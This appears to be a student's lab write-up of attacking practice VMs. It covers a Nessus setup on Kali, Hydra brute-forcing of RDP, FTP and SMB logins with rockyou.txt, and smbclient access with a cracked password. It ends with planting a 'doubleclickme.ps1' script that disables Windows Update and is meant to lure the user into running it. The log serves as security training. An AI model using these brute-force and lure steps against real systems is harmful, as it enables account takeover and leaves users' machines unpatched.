* Initialize the Kali VM. Credentials will be kali/kali.
* Navigate to the [Nessus Essentials](https://www.google.com/url?q=https://www.tenable.com/products/nessus/nessus-essentials&sa=D&source=editors&ust=1710581474704705&usg=AOvVaw0GKFBt7acRB14xaJ-PyUKI) web portal.
* Obtain an activation code for Nessus Essentials. Activate your copy of Nessus and note the credentials for future reference.
* You should obtain an email containing the activation code and a link to download Nessus.
* 

![](media/redkev-27.png)

![](media/redkev-28.png)

![](media/redkev-29.png)

* Run sudo dpkg -i Nessus-xx.x.x-debianxx\_amd64.deb to install Nessus.

![](media/redkev-30.png)

* Run sudo systemctl start nessusd.service to start Nessus.
* Check that the Nessus service is running by entering sudo systemctl status nessusd. You should see a status of “Active: active (running).” If you do not, you’ll need to initialize the Nessus service manually.

![](media/redkev-31.png)

* Open a browser and navigate to https://kali:8834 to finish configuring Nessus.

![](media/redkev-32.png)

![](media/redkev-33.png)

Continue

![](media/redkev-34.png)

![](media/redkev-35.png)

Skip since we already have an activation code

![](media/redkev-36.png)

![](media/redkev-37.png)

![](media/redkev-38.png)

![](media/redkev-39.png)

![](media/redkev-40.png)

[LeftHydra -l risk-analyst -P rockyou.txt 10.0.0.74 rdp

Slow goes one by one but I spend over 5 hours letting it run nonstop

hydra -l userlogin -P password-list-address ftp://<target-ip-address> -V   

Hydra -l vagrant -P rockyou.txt ftp://10.0.0.82 -V 

Faster and using ftp, 

I decided to run this later also and it was blazing fast but I should of start of sooner but it shouldn’t take too long.

![](media/redkev-41.png)

![](media/redkev-42.png)

VM froze and had to call it for today since it was getting late, so I will try again tomorrow.

The speed of brute-force attacks, such as those performed by Hydra, can vary depending on several factors, including the protocol being targeted, the complexity of the authentication process, and the efficiency of the attack tool itself. Here are a few reasons why brute-forcing an FTP server may be faster than brute-forcing an RDP server:

1. Protocol Complexity: FTP is a relatively simple protocol compared to RDP. The authentication process for FTP typically involves sending a username and password, and the server responds with a success or failure message. In contrast, RDP involves establishing a complex remote desktop session, which may include negotiating encryption, screen sharing, and other features. This complexity can increase the time it takes to perform brute-force attacks against RDP servers.
2. Network Overhead: RDP involves transferring graphical data between the client and server, which can result in higher network overhead compared to FTP, especially for remote desktop sessions with high-resolution displays or multimedia content. This additional network traffic may slow down the brute-force attack process.
3. Resource Requirements: RDP servers may have higher resource requirements compared to FTP servers due to the graphical nature of remote desktop sessions. RDP servers may need to allocate more CPU, memory, and network bandwidth to handle multiple concurrent connections, which can impact the responsiveness of the server during brute-force attacks.
4. Server Configuration: The configuration of the target server can also affect the speed of brute-force attacks. For example, if the FTP server has rate-limiting or account lockout policies in place, it may slow down brute-force attacks by introducing delays or temporarily locking out accounts after multiple failed login attempts. RDP servers may have similar security measures in place, but they may be configured differently depending on the administrator's preferences.

The smb brute force was successful

![](media/redkev-43.png)

Next we will try to access the share file and show it or mess with it

![](media/redkev-44.png)

I didn’t know I had to find a share folder name so I had to find it using linux.

-L means list

-U means username

![](media/redkev-45.png)

![](media/redkev-46.png)

![](media/redkev-47.png)

What does this mean? smb: \risk-analyst\Pictures\> ls . DR 0 Wed Jun 9 10:19:32 2021 .. DR 0 Wed Jun 9 10:19:32 2021 desktop.ini AHS 504 Wed Jun 9 10:19:32 2021

This output is from the ls command executed within the "Pictures" directory in smbclient. Let's break it down:

* The line starting with "." represents the current directory, "Pictures".
* The line starting with ".." represents the parent directory of "Pictures", which is "risk-analyst".
* "desktop.ini" is a file within the "Pictures" directory.
* The "DR" indicates that both "." and ".." are directories (folders).
* The "AHS" indicates the attributes of the "desktop.ini" file. "A" stands for Archive, "H" stands for Hidden, and "S" stands for System.
* The next column shows the size of each file or directory.
* The last column shows the date and time when each file or directory was last modified.

Next I plan to add a malicious script to stop windows update on the Windows 7 Pro VM whenever the user double clicks the ps1 file from the desktop or they can follow the 3 step instructions to run it on powershell to give them the best service.  
![](media/redkev-48.png)

![](media/redkev-49.png)

![](media/redkev-50.png)

Demo  
The RDP screenshot is from the Nessus Scan on 10.0.0.74 IP in the Vulnerabilities Section

![](media/redkev-51.png)

After Marco’s feedback, he suggested that I should change the format .txt to ps1 so its easier to run for the user. 

![](media/redkev-52.png)

1. Aggressive Scan with Stealth Scan (-sS)
2. Found out there is an open port on 445 which is the SMB
3. Also on the same line the machine is running Windows 7 Pro
4. Did a nessus scan on that IP address and went to the vulnerabilities section
5. Scrolled down and there was a RDP screenshot page
6. Now I figured out there are 3 users
7. Chose the brute force attack “risk-analyst”
8. Use the “hydra -l risk-analyst -P rockyou.txt 10.0.0.74 smb -t 16” command
9. Waited a dozen minutes and cracked the password “simcity”
10. Ran the smbclient to try to connect to smb to access file sharing
11. smbclient //10.0.0.74/Users -U risk-analyst
12. simcity as the password to login
13. ls     to list directorys
14. cd risk-analyst    to attack them
15. cd desktop    to put a ps1 file
16. Put doubleclickme.ps1    a powershell script that turns off windows update service
17. I have the option the delete it which is    del doubleclickme.ps1
18. Whenever the user double clicks the ps1 file, it runs powershell along with the script inside to disable

  
  
  
 

